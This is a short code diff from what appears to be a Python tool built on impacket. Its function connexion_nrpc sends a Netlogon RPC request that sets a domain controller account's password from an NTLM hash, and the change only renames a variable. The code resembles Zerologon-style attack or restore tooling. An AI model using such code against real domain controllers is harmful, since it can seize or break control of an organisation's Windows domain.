@@ -66,9 +66,9 @@ def connexion_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name, dc
 
       requete['Authenticator'] = authenticateur
 
-      pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(dc_mdp), sessionKey)
+      donnee = impacket.crypto.SamEncryptNTLMHash(unhexlify(dc_mdp), sessionKey)
 
-      requete['UasNewPassword'] = pwdata
+      requete['UasNewPassword'] = donnee
       resp = rpc_con.request(requete)
       resp.dump()
 
